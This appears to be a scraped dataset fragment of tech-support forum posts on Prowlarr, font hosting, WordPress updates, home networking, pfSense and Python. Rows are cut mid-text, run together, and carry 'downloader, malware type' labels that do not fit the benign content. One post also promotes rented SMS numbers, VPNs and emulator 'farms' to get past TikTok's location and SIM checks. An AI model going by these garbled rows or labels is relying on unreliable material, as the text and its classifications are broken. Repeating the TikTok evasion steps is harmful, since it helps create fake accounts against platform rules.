Prowlarr seems to work ok enough, but it always returns links to itself. Instead of providing a result as a link directly to an indexer it provides a link to the prowlarr api which presumably forwards that url to the actual download link.

Someone had told me that the Redirect checkbox in the Indexer settings on Prowlarr changes this, but this option is disabled for every torrent indexer I've tried to use.

So my first question is just that -- why does Prowlarr not provide direct links to the torrent or magnet and can this be changed?

If this can't be changed I have another problem I'm running into. My download client is not on the same network as Prowlarr.

But every link Prowlarr generates follows the format `prowlarr:9696/1/etc...`. It wants to link to its Docker container. This makes sense in a way because Prowlarr doesn't know what the external url is. This is, ostensibly, what the setting `Application URL` is for. So I set that to `https://prowlarr.mysite.com`, restart Prowlarr, run a search via Medusa, grab the result, and it still points to `prowlarr:9696`. 

I was told that this is because Caddy doesn't handle request headers in a way that Prowlarr likes (not sure why the request headers determine the grab url, but whatever...). I wasn't able to find any information about this other than a short comment about it requiring `proxypreservehost` on an Apache server. From what I've read about this, the analog in Caddy is adding the `transparent` directive to simply pass all headers untouched. But in Caddy 2.x this is the default and Caddy is already forwarding headers without modification.

I'd really like to get Prowlarr running, but its insistence on linking to itself (and to its own docker container) makes it impossible to have the download client on a different network than Prowlarr. Is this just not an option? Is it *required* that Prowlarr and the download client share a network?

840,"Advice on method for serving Google Fonts for multi-language site. Hi everyone, I need some advice on how we should host fonts on our multi-language site.  
I cannot decide between sticking with Google Fonts CDN, or self-hosting and optimizing the font loading.

For context, I work in-house with a site with content in 14 languages (including Japanese, Simplified Chinese, Korean, Thai, Russian, the rest use latin or latin-ext characters).  
The site is being renewed, due for release soon, so we're testing and making the final adjustments.

To maintain the type design across all regions, early on we opted for Noto Sans and its family members for the languages mentioned above (JP, KR, SC, Thai). We also use some symbols from the Material Symbols set.

One thing that stands out is the performance impact of serving Noto Sans through the Google Fonts CDN, which adds a payload of around 3MB.

My goal is to reduce this performance impact on the site (alongside image optimization, minification etc.) This drag on performance is messing with our core web vitals, especially on mobile.

The site is on Drupal, using Varnish cache, no CDN, and maintained by a local agency with experience in Drupal but not much experience in multi-lingual sites. For what it's worth, we're in Japan, so the agency is not so nuanced with latin (or non-JP) typefaces.

From my research, there are some key themes that we basically have a hypothesis on, but I'd like some advice and experience of how that works in the real world, so here I go:

* **Performance**  
To my understanding, there are a few issues here. Google Fonts does more on their side to improve and optimize, whereas we will do our best to optimize, but cannot dedicate as much time or resources.
   * Caching: Google CDN loading = cached once a day, vs. local hosting = cached for duration of user's cache setting. In theory, self-hosting wins on this count.
   * HTTP requests: Google Fonts means an HTTP request and downloading the payload, whereas self-hosting means downloading from the web server. In theory, self-hosting wins here.
   * No CDN: Google Fonts should win in theory here, because they are Google and we don't have a CDN, meaning different times for users in different locations.
* **Legal compliance/GDPR**  
A court in Munich, Germany said in January 2022 that use of Google Fonts constitutes a violation of GDPR since Google collects IPs when receiving the HTTP request for the font.  
Of course it is better to err on the side of compliance and follow best practices for data privacy, which implies self-hosting Google Fonts is better, however I have a few concerns:
   * Not yet widely adopted, and I don't know if this will be a domino effect kinda thing. (Remember when France and Austria decided Google Analytics is illegal?)
   * Maybe Google Fonts will anonymize IPs in the future, but who knows? (I guess IP collection is why Google Fonts is free in the first place)
   * Our site serves users in regions outside of Europe, so I want to stick to one method if possible. If that means self-hosting fonts, we should do that for non-EU regions as well.
* **Ease of setting:** This might be something more specific to us, but since the agency maintains the Drupal installation, we need to request them to upload and deploy assets like fonts and make edits to Drupal twig template files.  
Sticking with Google Fonts is easiest for all, since they just need to <link> the files and add the CSS.  
Self-hosting the fonts means we need to instruct them what to do, when to deploy, and go back and forth with them for testing.
* **Optimizations**   
Self-hosting Google Fonts requires some optimization to get close to the performance of Google Fonts CDN. This includes:
   * subsetting fonts based on the required ""unicode-range:"" already defined in the Google fonts CSS 
   * <link rel=""preload""...> to prioritize loading
   * base64 encoding and storing it in localStorage to reduce blocking time

Overall, self-hosting Google Fonts feels like the best choice for data privacy and reducing the data payload, but feels like we'd be fighting a losing battle to keep it light and fast, which is our main goal, leading to core web vital and hopefully SEO improvements.

842,"PSA: Never EVER format an SD card as internal storage. Here goes: my phone's storage was full, I decided to add an SD card, stupidly formatted it as internal storage without thinking about it, and let it do its thing by moving some data over. Immediately after, all my photos were completely messed up. Some just appeared as a grey square, some had a thumbnail but wouldn't load, some loaded but with a spinning wheel on top, and some behaved normally. Any new picture I took also turned grey after a while, and even media (old and recently taken) on WhatsApp appeared blurry, like when the media doesn't exist on the phone's storage anymore - even photos that I just sent a minute ago.

I decide to count my losses, since most of my photos are backed up on OneDrive, and I had been meaning to factory reset my (3,5 year old) phone anyway - a Nokia 7.2 - because it had been giving me various kinds of troubles recently (for example the GPS not working, as well as some other little annoyances). So I make sure to back up the phone settings to Google One, and to perform a last WhatsApp backup to Google Drive (which it's supposed to do once a day anyway) just in case, because it has my entire chat history from the last 10 years or more. I also do a quick Google search which tells me that old backups are kept for a week, so even if something got messed up by the SD card, I should still have older versions to revert to.

Well, you can probably guess where this is going. I perform the factory reset, reinstall my apps, everything is going great, the phone is more responsive again, blablabla. EXCEPT when I open WhatsApp and it asks if I want to restore my messages and media, which of course I do. It finds a 5,3 GB backup on Google Drive, which is odd because photos and videos should be included in this, but anyway, I only care about the messages anyway. It starts restoring, and is seemingly done after downloading around 70 MB of data, and then informs me that it was ""Unable to restore your chats from this backup. Do you want to restore your chats from an older backup?"" Well yes, I do. It then asks for permissions to check my Google account, and then process to inform me that there was no backup found on that account 

Long story short, my naive mistake of formatting an SD card to internal storage most probably cost me over 10 years of chat history, some of which I was frankly quite attached to. So yeah, don't be like me!",downloader,malware type

I'm testing out an auditing system on our domain and it's providing a report of all user downloads.  This is my first time using such invasive auditing tools.

I deem that to just completely not be secure.  I'm finding this to be rather common.

847,"Built an update checker plugin, running into an issue where the .zip file for the updated plugin requires HTTP headers to download and I cannot figure out how to make WP use those headers when requesting the .zip. I built an update checker plugin that enables WP to check if your plugin has an updated version and download/install it if its available.

My implementation is pretty much identical to [the implementation](https://github.com/rudrastyh/misha-update-checker/blob/main/misha-update-checker.php) from [this article](https://rudrastyh.com/wordpress/self-hosted-plugin-update.html).

The issue I am running into is with the [update() function](https://github.com/rudrastyh/misha-update-checker/blob/main/misha-update-checker.php#L127C3-L154C4):

    public function update( $transient ) {
    
    	if ( empty($transient->checked ) ) {
    		return $transient;
    	}
    
    	$remote = $this->request();
    
    	if(
    		$remote
    		&& version_compare( $this->version, $remote->version, '<' )
    		&& version_compare( $remote->requires, get_bloginfo( 'version' ), '<=' )
    		&& version_compare( $remote->requires_php, PHP_VERSION, '<' )
    	) {

    		$res->slug = $this->plugin_slug;

    		$res->tested = $remote->tested;
    		$res->package = $remote->download_url;
    
    		$transient->response[ $res->plugin ] = $res;
    
            }
    
    		return $transient;
    
    }

**What is the issue?**

The line:

    $res->package = $remote->download_url;

Is where we tell WP the URL to download the .zip file for the updated plugin. This works when the request to download that .zip file does NOT require HTTP headers, but since we do not want anyone to be able to download that .zip file we required a token as an HTTP header to request the .zip file.

I have verified the request goes through in Postman when the header is supplied, but I cannot figure out to tell WordPress that it needs to include that header when making a request to the *download\_url* value, and im honestly not sure I can with how this plugin interacts with WordPress.

This is where I wanted to ask this community if they have any idea how to achieve this?

I am starting to think that we need to protect that resource in a different manner, such as only allowing particular domains/IP addresses to be able to request it as I cannot for the life of me figure out how to tell WP HTTP headers are required for the request to go through

I feel like this is a not uncommon thing that needs to be done, people developing their own paid plugins wouldnt want the .zip file with their source-code to be downloadable but I have not been able to find any helpful info after researching for the past couple days

854,"The Linux Move/Upgrade Assistant and a word on the biggest flaw of getting people to move to Linux. So I'll jump into the idea first, then explain why I've had this idea. Fair warning though, I have very little programming experience, so at this point this is just an idea for anyone who might think this is a good idea.

Create what is basically an upgrade assistant to move people from Windows to Linux. Make it very simple to use. It will copy over files automatically (or from a backup which can be prompted for or created in the program) to the appropriate areas in Linux. It will auto install all of the programs the user needs with the Linux equivalents (or that the user selects, should they decide they don't need all the programs they've installed in Windows). Then they select a distro, with brief details as to what each distro is like. As a bonus, perhaps also have a prompt for familiar themes (i.e. Chicago95) that can be installed.

In short, this should be as close as possible to running a program and having it just install. This especially coming on the heels of an impending Windows 10 EOL

Now the question is why? Aren't many distros already easy enough to install? Well...yes and no. It is my belief that the biggest problem of getting people to move to Linux isn't program compatibility (although in a few cases that is accurate. Some games, CAD, the entire Adobe suite, etc.). More than anything, however, I believe it is the process of getting Linux installed, moving files, reinstalling programs, etc. that loses people.

You've just told someone that they should install Linux. Besides, they use their computer mainly for browsing the internet and checking their email anyway. Great! Now all they need to do is get or find a USB drive, make sure they have a way to copy over all of their files, install Linux on the computer and- oh whoops you lost them when they heard about copying an iso to a USB drive.

Which do you believe will be easier? Telling those interested in Linux all of that, or just telling them to download a program which will do most of the ""heavy lifting"" for them? Because I personally believe it'd be the latter.

I bought one second-hand and it has its faults (which I understood, I got it cheap) but I'm trying to find what to do so I can use it with my computer.

If I connect it using the HDMI/power/USB tri-cable that comes with it, the tablet screen turns off and it enters ""mobile"" mode. Which is fine, it still works *but* the hardware to adjust the tablet settings is no longer supported by Wacom, since it's so old. Bizarrely the settings on the actual tablet don't include turning hand-touch off/on? When it's not connected to the computer, it's pen only.  
When it is, I can't draw because it recognises my hand.

From having a google, someone had a similar problem where the screen would work but only if you used a HDMI hub? Weird.

The device itself has limited internet connection, and for some reason the PlayStore (for downloading apps to the tablet) only has access to books. I guess even they're in on discontinuing access?

866,"Moving my data from a broken 1TB ssd to a brand new 2TB ssd.. For context, my computer has this button on the front that acts as a hard reset. Instant power loss to the computer and it reboots right after. I hate it with a passion and am planning to put a nuke button over it to prevent this scenario from happening again.

A few days ago, I was booting up my computer when I accidentally pushed the hard reset button on accident. Next thing I know I have the error: S.M.A.R.T status bad, Backup and Replace. So I order a new drive off of amazon and keep my hands off my computer cause I'm terrified of losing my data. The new drive gets here and I think it would be an easy case of plugging it in and using a data moving tool to move everything over, but when I go to disable the S.M.A.R.T status error to access those tools, my computer gets stuck in an endless boot loop that doesn't even make it to the windows loading screen. 

Since then, I have installed Lubuntu onto an USB and I can verify through that that all of my old files are still intact in the old 1TB drive. I also installed a fresh copy of Windows 10 on the 2TB drive, except I can't look into the 1TB drive from the new copy of windows in the slightest. I found that I can move stuff manually from the 1TB to the 2TB using Lubuntu, but I mainly want to keep the Windows license and the many code librarys I have downloaded over the years without needing to reinstall them all from scratch. Any suggestions on how I can move everything over? I am was thinking about just mirroring the drives but now I'm worried that that would end up putting the 2TB into the same situation as the 1TB.

TL;DR: Have a 1TB drive with Windows 10 that can't boot or be read through windows but has data. Have a 2TB drive with a fresh install of Windows 10. I have Lubuntu which I am using to view the old data on the 1TB loaded on a thumbstick. I want to move everything from the 1TB to the 2TB.

I use my iMac infrequently, as most things I can just do on my iPhone or MacBook, but today I decided to open Photos to check how some photos I took some day ago and plan on getting printed look on a 27"" screen. I started the app, and of course they haven't synced over. In fact, nothing since February has synced over. *""Fair enough, I haven't used Photos on my iMac for an eternity""*, I thought.

I scrolled down to the bottom of the library and below the count of photos and videos it said that it had last updated on the 5th of July. Funny, I thought, because the latest photo in the library is from the 3rd of February. I clicked around a bit to see if that would awaken demon that lives in this app and start the sync, but nope, no indication of it starting. I googled if there was some way to force it to update, but nope, Apple wouldn't implement something so logical in this app.

I finally found someone mentioning to toggle the sync off and on in Photos > Settings > iCloud. I clicked it to turn it off, and guess what this janky high school project of an app tells me? *""iCloud photos are currently updating""*, with the option to either keep updating or turn iCloud photos off.

Can someone *please* help me understand the superhumanly genius logic that Apple applied when they designed this user interface that includes literally 0 indicators of an ongoing update? No little spinning wheel, no progress bar, no count of photos it's currently downloading. Not even a vague little green/amber/red light indicator. Not even that comically inaccurate text line at the bottom indicates it in my case. There is absolutely no way of telling in this app that it's updating other than trying to turn the sync completely off and then seeing the warning message.

For a bit of context, I'm a Network Engineer, and like many of us here, I have a homelab. In my homelab, I have a beautiful Netgate 6100 Max that I deployed several months ago, and things have been going great with it! My Netgate is connected to my modem using an LACP link aggregation in an attempt to hit the beyond gigabit speeds I pay for, since my modem only has 1G links. From there, my Netgate is connected over fiber via a 10G SFP+ optic and cable going to a Juniper 2300-C. My system that I'm using for these tests is then connected to my switch.

The only issue I initially noticed was that my speeds weren't what they should be. But, I figured that had something to do with the cable I was using for my connection not being the best and chalked it up to some signal loss and decided to figure it out later.

Fast-forward to today, when I set up the site-to-site. Despite not being a fan of your typical VPN services, I ended up paying for a subscription to Surfshark. This is purely because I have a media server, and I download lots of Linux ISOs (if you catch my drift) and my ISP started having an issue with that. So I set up a site-to-site Wireguard connection on it with an outbound NAT rule for the connection and then configured a gateway for the VPN. Afterward, to route the traffic from the server in question, I just created a policy based route to send the traffic over the tunnel, and it works great!

After verifying that the server in question's public IP had indeed changed, I decided to do a before and after comparison on my Internet connection speed, and to my surprise and confusion, it's FASTER than it was before. I've run the tests several times using several test machines, and it's always the same. Below are the screenshots of one of those tests from the server.

The bottom of which, is more like what I should be getting.

I've searched around, and I can't seem to figure out what is going on here. I've tried applying MTU and MSS clamping to my WAN connection since it was applied to the VPN config, and I got very similar results still. Not only that, but I also went under System > Advanced > Networking and unchecked everything that was checked under the Network Interfaces section, and still I got the same results.

I'm not sure what to make of this, since the Wireguard server lives on the Internet, meaning it needs to go out over the WAN connection to even connect. So how can it be faster than untunneled traffic? Any and all help here is VERY much appreciated. I'm at a loss, and I would LOVE to be able to utilize my full bandwidth on things that aren't my media server. Help me Pfsense community, you're my only hope.

It's not a very large property, but I want to improve the Wi-fi situation as I currently have a really bad dead spot in the Main bedroom and it's nigh unusable and causing me to accidentally eat up my mobile data.

There are no ethernet ports/wiring around the house apart from the connection line. I currently have a TP-Link AX1800 Dual-bandWifi-6 router and am paying for 200 Megabit download speed on the OFNL.

I have attached some images below of the floorplan of my house. The router is currently stored on the ground floor in the cupboard marked St which is a small cupboard near the entrance where the connection point has been installed. This is pretty stupid as the door is closed and probably impacts the signal but I'm not sure if this can be averted as it's where the OFNL box comes in and is then connected to my router.

As I said upstairs is a bit of a dead spot in general and has connection issues with the Master Bedroom being by far the worst, most of the time not having a connection or having something slow like 2/5mb/s.

My home office is currently in Bedroom 2 on the first floor and it's important to have good connection there. I get pretty good signal (150/200mb/s) but sometimes have outage where I can't even connect to the router although this is quite rare and has only happened a couple of times in the past 6 months for a few minutes at a time.

The kitchen is a bit slower than I'd like also but I get 200mb/s in the living room.

I was considering buying some TP-Link Deco mesh network extenders but I wasn't sure if this was a good idea. Also not sure how many or where to put them.  Also not sure whether it's worth getting Wifi-6 supporting ones.

Either way I thought asking today would be a good idea as there are prime day deals on so I'm going to try and fix this mess today! Appreciate the advice in advance.

I have been tasked with putting together a package for an AV company that puts on events. They want to do an ad-hoc network that will support up to 300 wireless clients at a time. The use case is simply to provide public wifi to check emails, browse, social media, etc. The AP/switching/routing portion is pretty easily accomplished. We plan on implementing client isolation, of course, and bandwidth limiting each client to about 2 Mbps. So total throughput really would only need to be 600Mbps if all devices were running full tilt.  
  
They want to use cellular to connect to WAN, and so my first thought was Cradlepoint. Specifically looking at this one https://cradlepoint.com/product/endpoints/w1850-series/ .

However, there's one that has 750k records, and reading it all into memory is not feasible for multiple reasons. So I've been searching for ways to chunk this if possible, kind of like I'd do with a .json or .csv file.

I've tried _requests_ (not married to it though, it's the one I know) but I think I'm completely wrong in its usage:

    import requests
    import json

    response = requests.get(api_endpoint, headers = headers, stream = True)

    for chunk in response.iter_lines(chunk_size = 10_000, decode_unicode = False, delimiter = None):
        if chunk:
            data = json.loads(chunk)
            # do something with each chunk (data)

This runs but doesn't work as I expect.
The structure of the response (what would be the delimiter?):

    [
        {
            ""thing1"": ""something"",
            ""thing2"": ""otherthing""
        },

When I attempt to connect to the workspace using the client application, it just goes all white full screen briefly, before closing and going back to the ""Disconnected"" screen.

I've tried rebooting, rebuilding and restoring. No change.

I deleted the workspace and created a new one, and started installing some packages again, and again, after a reboot it never came back again.

I suspect it might be related to me installing docker (using these instructions: https://www.digitalocean.com/community/tutorials/how-to-install-and-use-docker-on-ubuntu-22-04), but I'm unsure.

We have docker installed on the Amazon Linux 2 based workspaces, and that works fine... so unsure why it would be an issue on the Ubuntu 22.04 ones?

The web console says it's in good health and available, but I cannot connect a client to it.

In wifi speedtests, I do often have between 165 to 220 download and average 8 to 12 upload.

I work from home and barely ever have trouble with video calls that I am on all day long.  I run updates often on all devices except his phone.

The solution was very simple: instead of clicking directly on the app, I had to open it using right click>Open with.

I was shocked. What is the purpose of imposing this restriction if it can be bypassed by using Open with? Am I considered some kind of advanced user for being able to use Open with?

In the same vein, I'm incredibly amused by the lack of basic apps in the store, such as Spotify, and then being hit with ""this is an app from the Internet"" after downloading the client via browser. I can only assume that this has to do with the App store imposing their 30% cut and certain corporations refusing it, yet it's so funny to me that the Spotify app is some kind of mysterious and exotic piece of code in the mind of the OS.

As per suggestions on stackoverflow, my virtual environment is running on Python 3.7(.8), and installing the packages seems to be no problem (where previously there was issues due to using a too recent version of Python).

948,"Tiktok Geo-Targeting Guide: Target Tier 1 Countries. Doing affiliate marketing or Ecom through organic TikTok content is an excellent  method for monetizing your product or affiliate offer. This will enable marketeers to operate on huge profit margins. According to Statista, the  United States has the world's highest TikTok audience as of January  2022. The social networking platform has around 136.5 million active US  members. Indonesia came in second with 99 million, Brazil came in third  with 74 million, and Russia came in third with over 50 million  registered users.

Imagine you are from the United States and you want to target  people from the United Kingdom; this can be difficult to do because of the algorithm. For this, we have the solution: **''Tiktok Geo-Targeting Guide'':**

Here is a guide for you guys on how to target organic users from every Tier 1 country with a strategy called 'geo-targeting'.

**Step One**: On iPhone and Android, go to Settings > Location Services > TikTok and turn off:  ""Access My Current Location.""

**Step Two**:  Clear cache in the Tiktok app (tap Profile in the bottom > right tap  the 3-line icon in the top right > tap Settings and Privacy > tap  Clear cache) and delete the app.

**Step Three:**  Use a Virtual Private Network (VPN) or a proxy server to change your IP  address. I advice using a VPN on an individual phone. If you want to  run a Tiktok farm you can run emulators and proxies. I got a VPN provider on a discount from this [Community Website](https://www.vpngrades.com/) .

**Step Four:** Download the provider's app and switch your location to the US. Make sure to use a static server

**Step Five:**  Download Tiktok and make an account using an American sim card: TikTok  uses your SIM region code to determine what you see, so switching to a  foreign SIM card will change your location and allow you to access  content specific to that region. It is also critical to turn off the GPS  feature on your mobile device to avoid being tracked.

I use this [SMS verification](https://sms-activate.org/?ref=1881109) service

Simply  just search for: Tiktok when you are for on the services section >  rent a number > fill in the number when creating the account and see  what the verification code is on the website

**Step Six:** Post viral content and enjoy an US targeted audience.

# How does TikTok know where you are?

TikTok  uses your SIM card, IP address, and GPS to track your location. You are  prompted to enter your phone number as soon as you sign up for TikTok.  They hope to avoid fake accounts and scammers by doing so. Also, in some  versions of the software, if you add a location tag to a post, your  location is automatically tracked.

Pro-tip:  for non-native speaking english countries; changing your language on  TikTok to access other region content could speed-up the process and  success rate after finishing all the steps.

For those wondering, definitely know your Nmap, netcat, sql injections, XSS, LFI, RFI, etc. Have the ability to at least interpret syntax for Python, Ruby, Bash, etc, and know what the scripts are supposed to do. 

My study method:

I started by downloading the study guide from Jason Dion's Udemy course. I then took the test at the end of the course and scored a 65%. I then began reading the study guide and highlighting everything I needed to learn or review. This took a hot minute as IIRC it's like 360 pages. When I didn't have the leisure to focus on this, I would listen to the videos but didn't really pay attention. Once done with highlighting, I made flash cards broken down into sections. I broke section 5 into multiple sections (coding, tools, etc). Got Quizlet+ and studied the cards. 

I also paid for THM and started the Jr. Pentester path. I only got about 25% thru that. 

I am also enrolled in WGU so I was able to get a student account with HTB Academy for like $8/month, IIRC. Found that to be a lot more fun than THM.

THM and HTB were CRITICAL to me passing the test, I believe. And, I'm a Nmap master now ;D 

Throughout my studies, I did Jason Dion's Practice exams on Udemy (There are only 6) and scored an average of about 75% (Yikes). I couldn't find any other tests and didn't really bother. My confidence was pretty low going in, but I have enough experience with Pearson VUE that I could stay calm.  Some people like to skip PBQs but I did them right away. They kicked my behind. On the 3rd one, I let go of the mouse and thought ""I don't want to do this anymore, Grandpa!"" Really made me doubt my life choices. Then they gave me 2 more... I just did what I could and moved on to the questions. As always, read them 2-3 times and really think about the answer. Some were really tricky and confusing, for sure. 

My experience: 1 year in Help Desk roles and 3 months as a PC repair tech. 5 years as a Security officer. 

Final note: Don't underestimate this exam. I think overall it's less memorization than CySa+ and more practical application. I can't imagine anyone passing without some hands-on experience.

For days I've been trying to figure out the right settings spending hours and hours each day. I'm used to gaming on console like Xbox Series X for basically my whole life. I have all drivers downloaded for Nvidia, MSI, and AMD. Just need some help with the right settings in NVCP and Windows 11. I want to ""set and forget"" and not worry about manually adjusting NVCP for each game unless I have to of course. I do have an LG CX OLED, so I also want GSYNC to be working and 4K 120Hz etc. The way I have it set now seems okay, but I feel like I see some stuttering in games, so not sure if Gsync is indeed working, I really wanna make sure that works. The only setting I know for sure needs to be on in NVCP is Vsync and Gsync, and in game Vsync off. not sure about anything else like Low Latency or setting a frame cap in NVCP.

When it comes to in-game settings, I do like 4K maxed out with ray tracing when I can and really think I'll like frame gen. So I wanna be able to use stuff like DLSS and Frame Gen and Gsync etc and not get tearing or stuttering or high latency in games like Spiderman Remastered and Destiny 2, which are the main ones I'm wanting to play.

it's just confusing trying to research and people saying different things like setting a frame rate counter, or using Low Latency and AMD Reflex. I definitely don't want the frame rate to go above my monitor's refresh rate, because I'll get tearing.

It's still perfectly functional although the spacebar has stopped working which makes typing really annoying (I have to paste every space!). Almost all the software I use is cross-platform (Firefox/VSCode/Blender/FreeCAD/Audacity etc.) and I don't think there will be any MacOS bits I really miss (aside from maybe WhatsApp desktop - although I'm aware there are non official alternatives).

The new machine is a Dell XPS Pro - I chose it because they offer Ubuntu installed as an option so I'm fairly confident it should work OK. However, this machine will come with Windows 11 Pro installed. I've never used Windows 11 and I don't play games so not sure if I will need it. However, I've read that there are some things Linux can't do and wondered if I should keep Windows and dual boot. If so, what partitioning scheme should I use? Have a shared partition (VFAT?) or rely on Windows being able to mount EXT4 partitions?

If I ditch Windows altogether, can I get it back again, assuming my licence is still valid?

While the download speeds aren't really much better, the ping/latency seems a bit lower and more stable. When it's working.

For the past couple of days since I've installed it, it's mostly been fine. However, since this morning basically anything like trying to watch a YouTube video or open a web app is causing the internet to drop out at the router. The powerline adapter lights all stay on, it's the router itself that's dying.

I know powerlines aren't ideal, but it's not really feasible to get a direct ethernet cable from the router to the room my PC is in. Anyway, any ideas would be greatly appreciated. Thanks!",downloader,malware type

The Matria part worked fine. but when installing mutter-rounded, when the package.sh is running, it could not run the build-dep -y mutter , saying it did not find the mutter source package. so I went to mutter index, downloaded the tar.xz file for gnome42.5, and manually installed using meson file in it + ninja command.

994,"Ned help vectorising function. I'm entirely self-taught python with maybe intermediatish skills.

I am currently undertaking a personal project where I have downloaded my location history from google (Dec 2011-Jul 2023 i.e. 11 years worth). My end goal is to map all of these locations (relatively straightforward - i'm a spatial analyst by day).

I am going to link the location history to my photo collection from over time to do some additional analyses like most popular time of day for photos etc.

The timestamp in the data i downloaded is in UTC and I am trying to add the timezone to the dataframe as I want the location timezone, not UTC.

After looking on stack overflow, I found the timezonefinder package and with some help from ChatGPT I  have written the following function to return the timezone:

    def get_timezone(lat, lon, pbar):
        tf = TimezoneFinder()
        timezone = tf.timezone_at(lng=lon, lat=lat)
        pbar.update(1)
        return timezone

I started off using the 'apply' method to apply this to my dataframe (but there are 2 million rows and it is taking forever).

I started researching quicker methods and came across np.vectorize and the code for that is

    with tqdm(total=len(locations)) as pbar:
        locations['timezone'] = np.vectorize(get_timezone(locations['latitudeE7'],
                                                        locations['longitudeE7'],
                                                        pbar)
    

I am currently running this but tqdm is estimating to take 24 days (579+ hours) and it doesn't appear to be any faster than running the apply with a lambda function.

So my question is what is the fastest way to apply something like this to my entire dataframe? Or do i just have to wait? My computer is not the fastest (has a GPU but not a fancy one). I included the progress bar so i can see where it is up to. However, removing it doesn't make it much faster.

Thanks for any help in advance.

At work we have a old WatchGuard XTM 5 Series box. It was running an old version of OpenWRT. I upgraded it's hardware and I'm looking at putting pfSense on it. 

We often refurbish computers for resale which often means downloading the same Windows updates over and over. From what I've been reading Squid cache was great for speeding up Windows updates but that no longer works. Is that correct? I know about WSUS but I expect if we tweak settings in Windows to connect to the WSUS then eventually the tech is going to forget to untweak those settings and we're going to put out the door a refurbished computer with incorrect Windows Update settings. 

I was looking at what drive to put in the pfSense box. It originally was using a 1 GB CF card but it can support a 2.5"" SATA drive. I'd like to keep some logs. I was thinking I'd probably just keep them on the drive in the pfSense box. I know for serious logging people send the logs to be stored on another device on the network but that seems like more than I need in my case. If I put an SSD in the XTM 5 series box will the SSD wear out quickly? Should I just put in a spinner? I do have a used mystery brand 32 GB mSATA SSD (HDSSESB-032GB) and a used 80 GB Intel SSD 320 Series SSD to pick from. I think the Intel 320 was meant for more rigorous use. Other than that I have a couple old spinners like a 2.5 inch 160 GB WD Scorpio Black. Sure, the speed of an SSD is nice but am I correct in thinking that pfSense runs mostly from RAM after the device is up and running?

This has started happening recently and my hunch is it's something to do with dropbox messing with my file structure and trying to manage hard drive space.

Problem 1: I try to send a file from airdrop from my phone to my computer. The airdropped file should go to my downloads folder. I see the file sent from the phone, and the downloads folder ""jumps"" in the dock, indicating a new files is there, but I can't find the file in that folder.

Problem 2 (The main problem): All my files that are sync'd in dropbox are no longer ""on"" my computer. They have the cloud download icon next to them. I can open them, which initiates a download of the individual file, but I can't quick look them (very annoying when going through lots of images trying to find the right one). I don't remember ever telling dropbox to remove files from my computer to save space .

I've found some accidental solution ... unchecking the folder in dropbox to removing the sync, which to my horror removes all the files from my computer. Then re sync'ing the folder will bring the files back in a fully downloaded form, but this can't possibly be how dropbox does this by default? Are the files really ""deleted"" or are they just removed from me seeing them?

Maybe I'm getting old, but I'm really missing the days when I understood where my files were and computers didn't try to manage things for you automatically. Any tips out there to make my computer behave the way I expect it to?

1010,"Problems With A PowerLine Adapter. I've recently bought a power-line adapter that I have connected to my router, so that I could have an Ethernet connection to my PC. I was also hoping that this would improve my download speeds. 

Using a powerline adapter, my download speeds were a lot more consistent. But if I attempted to download a large file, like a game on steam, and then opened up an internet browser and attempted to access a website, I wouldn't be able to. I'd instead get a ERR\_CONNECTION\_CLOSED message. This wouldn't just be for my own PC, no other devices in my household would be able to do web browsing.

However, if I attempt to do some web browsing whilst downloading a game over wi-fi, which I assumed would be slower, then nothing is wrong at all! All devices in my household can access the internet as well, although not as fast as it would be if I wasn't downloading.

I was hoping for an explanation as to why this is the case, as I was under the impression that a wired Ethernet connection to my router via a powerline adapter would improve the speeds I got on my PC, and improve the performance  for the other wireless devices in my household, like phones and tablets, as there would be less 'competition' over the Wi-Fi, as I would be using a wired connection.

I need some guidance on what to do moving forward.

I have just woken up from my sleep, and as usual, I first looked at my Android phone for any notifications. I immediately noticed that Firefox was left open, but it was on the Australia Commonwealth Banking website. I am from Australia, and although I do use the Commonwealth app, I never browse it on Firefox. This has triggered an alarm for me, and I started investigating.

At least four tabs have been open. Holding onto the back arrow button on Firefox has shown that the tabs had several browsing activities. One was used to search for IBAN on DuckDuckGo, and many others were linking to the Ukraine website for donation.

I was definitely spooked by this. I had no idea what has happened. Before sleeping, I was browsing Lemmy with wefwef.app and shortly locked my phone to sleep at around 3 AM.

In hindsight, I have deleted my Firefox browser, downloaded Malwarebyte AV/Bitdefender, and turned off the internet on my phone. I probably should have kept Firefox for further investigation.

1043,"Announcing PodFetch v4.0.0. Hi selfhosters,

 I am happy to announce [PodFetch](https://github.com/SamTV12345/PodFetch) version 4.0.0

**What is PodFetch? What is a podcast server?**

A podcast server is a service that you can host on your own. It can download/sync podcasts from other popular podcast hosting providers like acast and offer unique features compared to e.g. iTunes. A selfhosted podcast service may also offer a lot more features than the popular podcast sites as they don't want you to download the mp3s and instead use their website. The advantage of having this locally is that you don't need to create an account on another website to sync your listening experience. It is your server, you can host the podcasts and decide who can also join your podcast server and be sure that your data is not handed out to third party data horders like Google. It can also be used to hide your real IP address as only the server that you host the podcast service on is handing out the IP address in order to download podcasts. So if you are on e.g. on vacation you can simply connect to the Podcast server and start listening.

**Why choose PodFetch?**

PodFetch solves a similar problem to Podgrab. But in comparison to it it is actively maintained and has many more features than Podgrab. The biggest difference is that it supports the GPodder API, so you can start listening via AntennaPod on mobile, come back home and continue listening in your browser via the WebUI. Noteable is also the support for searching via Podindex, authentication via basic auth or OIDC like Authelia/Keycloak and a synced listening (Whenever you stop listening you can continue listening later).

It also contains now a pleasing and refreshing look and feel

Last but not least: It is written in Rust thus blazingly fast.

**What is new in Version 4.0.0**

* **Complete redesign of the UI by** u/jchue

In the past month jchue made an incredible effort in designing, creating wireframes and implementing the UI concepts in React. So all Kudos go to him and his efforts of making PodFetch easier to navigate and understand.",downloader,malware type

My workaround is to add an os.remove(file_name) to the beginning to clear it out, but I feel like there has to be a more professional approach. Any suggestions?

It's also possible that I'm failing to understand what's happening. There are too many files for me to check them all - it could also be that the renaming step gets skipped entirely. I don't think it is, but it's not impossible.

1050,"Airflow or something else for orchestrating non-data-centric pipelines?. Hi all, I'm looking to see if Airflow is the best solution for what I need or if there is some other package that might be better suited.

Quick background: My work involves processing video data. First ingesting it, transcoding it, running it through several AI models (computer vision, audio processing, etc) to find the most interesting moments, and then making 10-30sec clips of those moments. It's not strictly a 100% data-centered task: the ingestion part involves downloading from remote devices and normalizing the video, the AI part involves several stages of running models but also includes some compute-heavy analysis of usually 4-500k db records per stream, and the final output stage is almost purely using ffmpeg to cut clips from the original stream.

